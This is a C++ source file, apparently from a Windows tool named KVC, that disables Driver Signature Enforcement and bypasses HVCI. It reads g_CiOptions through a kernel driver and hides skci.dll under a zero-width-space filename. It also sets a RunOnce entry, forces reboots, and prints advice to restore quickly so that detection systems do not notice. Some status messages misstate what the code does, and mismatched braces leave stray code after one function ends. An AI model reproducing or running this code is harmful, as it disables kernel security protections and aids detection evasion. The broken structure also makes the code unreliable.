#include "Controller.h"
#include "common.h"

bool Controller::DisableDSE() noexcept {
    // Check if HVCI bypass already prepared (pending reboot)
    HKEY hKey = nullptr;
    bool bypassPending = false;
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
                      KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t state[256] = {0};
        DWORD size = sizeof(state);
        
        if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
                            reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
            if (wcscmp(state, L"AwaitingRestore") == 0) {
                bypassPending = true;
                
                // Verify the renamed file actually exists
                wchar_t sysDir[MAX_PATH];
                if (GetSystemDirectoryW(sysDir, MAX_PATH) > 0) {
                    std::wstring checkPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
                    if (GetFileAttributesW(checkPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
                        // File doesn't exist - state is stale/invalid
                        bypassPending = false;
                        DEBUG(L"Stale bypass state detected - skci.dlI not found");
                    }
                }
            }
        }
        
        RegCloseKey(hKey);
        hKey = nullptr;
    }
    
    // If bypass already prepared, prompt for reboot without touching driver
    if (bypassPending) {
        std::wcout << L"\n";
        INFO(L"HVCI bypass already prepared from previous session");
        INFO(L"System reboot is required to complete the bypass");
        INFO(L"After reboot, use 'KVC DSE OFF' to disable driver signing");
        std::wcout << L"\n";
        std::wcout << L"Reboot now? [Y/N]: ";
        wchar_t choice;
        std::wcin >> choice;
        
        if (choice == L'Y' || choice == L'y') {
            INFO(L"Initiating system reboot...");
            
            // Enable shutdown privilege
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
                CloseHandle(hToken);
            }
            
			// Initiate reboot
			if (InitiateShutdownW(NULL, NULL, 0, SHUTDOWN_RESTART | SHUTDOWN_FORCE_OTHERS, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != ERROR_SUCCESS) {
				ERROR(L"Failed to initiate reboot: %d", GetLastError());
			}
        }
        
        return true;
    }
    
    // Normal flow - proceed with driver operations
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE bypass");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        EndDriverSession(true);
        return false;
    }
    
    ULONG_PTR ciOptionsAddr = m_dseBypass->FindCiOptions(ciBase.value());
    if (!ciOptionsAddr) {
        ERROR(L"Failed to locate g_CiOptions");
        EndDriverSession(true);
        return false;
    }
    
    auto current = m_rtc->Read32(ciOptionsAddr);
    if (!current) {
        ERROR(L"Failed to read g_CiOptions");
        EndDriverSession(true);
        return false;
    }
    
    DWORD currentValue = current.value();
    DEBUG(L"Current g_CiOptions: 0x%08X", currentValue);
    
    bool hvciEnabled = (currentValue & 0x0001C000) != 0;
    
if (hvciEnabled) {
    INFO(L"HVCI detected (g_CiOptions = 0x%08X) - hypervisor bypass required", currentValue);
    INFO(L"Preparing secure kernel deactivation (fully reversible)...");
    
    SUCCESS(L"Secure Kernel module prepared for temporary deactivation");
    SUCCESS(L"System configuration: hypervisor bypass prepared (fully reversible)");
    INFO(L"No files will be permanently modified or deleted");
    std::wcout << L"\n";
    
    // Single question - if Y, do everything; if N, do nothing
    std::wcout << L"Reboot now to complete DSE bypass? [Y/N]: ";
    wchar_t choice;
    std::wcin >> choice;
    
    if (choice != L'Y' && choice != L'y') {
        INFO(L"HVCI bypass cancelled by user");
        return true;
    }
    
    DEBUG(L"Closing driver handle before file operations...");
    m_rtc->Cleanup();
    
    DEBUG(L"Unloading and removing driver service...");
    EndDriverSession(true);
    
    DEBUG(L"Driver fully unloaded, proceeding with bypass preparation...");
    
    if (!m_dseBypass->RenameSkciLibrary()) {
        ERROR(L"Failed to prepare hypervisor bypass");
        return false;
    }
    
    if (!m_dseBypass->SaveDSEState(currentValue)) {
        ERROR(L"Failed to save DSE state to registry");
        return false;
    }
    
    if (!m_dseBypass->CreateRunOnceEntry()) {
        ERROR(L"Failed to create RunOnce entry");
        return false;
    }
    
    SUCCESS(L"HVCI bypass prepared - reboot required");
    INFO(L"Post-reboot: 'kvc dse' -> if 0x00000000 -> load driver -> 'kvc dse on'");
    INFO(L"Detection systems may scan for prolonged 0x00000000 state - restore quickly");
    INFO(L"Future Windows updates may enhance monitoring - disable Driver Signature Enforcement only when needed");
    
    INFO(L"Initiating system reboot...");
    
    // Enable shutdown privilege
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
        CloseHandle(hToken);
    }
    
    // Initiate reboot
    if (InitiateShutdownW(NULL, NULL, 0, SHUTDOWN_RESTART | SHUTDOWN_FORCE_OTHERS, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != ERROR_SUCCESS) {
        ERROR(L"Failed to initiate reboot: %d", GetLastError());
    }
    
    return true;
}    
    bool result = m_dseBypass->DisableDSE();
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::RestoreDSE() noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE restore");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    
    bool result = m_dseBypass->RestoreDSE();
    
    EndDriverSession(true);
    
    return result;
}

bool Controller::DisableDSEAfterReboot() noexcept {
    // Check if this is actually post-reboot or just pending bypass
    HKEY hKey = nullptr;
    bool actuallyPostReboot = false;
    
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Kvc\\DSE", 0, 
                      KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t state[256] = {0};
        DWORD size = sizeof(state);
        
        if (RegQueryValueExW(hKey, L"State", NULL, NULL, 
                            reinterpret_cast<BYTE*>(state), &size) == ERROR_SUCCESS) {
            if (wcscmp(state, L"AwaitingRestore") == 0) {
                // Check if skci.dlI still exists (means we haven't rebooted yet)
                wchar_t sysDir[MAX_PATH];
                GetSystemDirectoryW(sysDir, MAX_PATH);
                std::wstring checkPath = std::wstring(sysDir) + L"\\skci\u200B.dll";
                
                if (GetFileAttributesW(checkPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                    actuallyPostReboot = true;  // File exists = real post-reboot
                }
            }
        }
        RegCloseKey(hKey);
    }
    
    // If skci.dlI doesn't exist, user hasn't rebooted yet
    if (!actuallyPostReboot) {
        std::wcout << L"\n";
        INFO(L"HVCI bypass prepared but system has not been rebooted yet");
        INFO(L"Please reboot to complete the bypass process");
        std::wcout << L"\n";
        std::wcout << L"Reboot now? [Y/N]: ";
        wchar_t choice;
        std::wcin >> choice;
        
        if (choice == L'Y' || choice == L'y') {
            INFO(L"Initiating system reboot...");
            
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
                CloseHandle(hToken);
            }
            
            if (InitiateShutdownW(NULL, NULL, 0, SHUTDOWN_RESTART | SHUTDOWN_FORCE_OTHERS, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_RECONFIGURE) != ERROR_SUCCESS) {
                ERROR(L"Failed to initiate reboot: %d", GetLastError());
            }
        }
        
        return true;  // Exit WITHOUT touching driver
    }
    
    // Continue with actual post-reboot bypass...
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for post-reboot DSE bypass");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    DEBUG(L"Driver handle opened successfully");
    
    m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    
    bool result = m_dseBypass->DisableDSEAfterReboot();
    
    EndDriverSession(true);
    
    return result;
}

ULONG_PTR Controller::GetCiOptionsAddress() const noexcept {
    if (!m_dseBypass) {
        return 0;
    }
    
    return m_dseBypass->GetCiOptionsAddress();
}

bool Controller::GetDSEStatus(ULONG_PTR& outAddress, DWORD& outValue) noexcept {
    PerformAtomicCleanup();
    
    if (!BeginDriverSession()) {
        ERROR(L"Failed to start driver session for DSE status check");
        return false;
    }
    
    if (!m_rtc->Initialize()) {
        ERROR(L"Failed to initialize driver handle");
        EndDriverSession(true);
        return false;
    }
    
    if (!m_dseBypass) {
        m_dseBypass = std::make_unique<DSEBypass>(m_rtc, &m_trustedInstaller);
    }
    
    auto ciBase = m_dseBypass->GetKernelModuleBase("ci.dll");
    if (!ciBase) {
        ERROR(L"Failed to locate ci.dll");
        EndDriverSession(true);
        return false;
    }
    
    outAddress = m_dseBypass->FindCiOptions(ciBase.value());
    if (outAddress == 0) {
        ERROR(L"Failed to locate g_CiOptions address");
        EndDriverSession(true);
        return false;
    }
    
    auto currentValue = m_rtc->Read32(outAddress);
    if (!currentValue) {
        ERROR(L"Failed to read g_CiOptions value");
        EndDriverSession(true);
        return false;
    }
    
    outValue = currentValue.value();
    
    EndDriverSession(true);
    return true;
}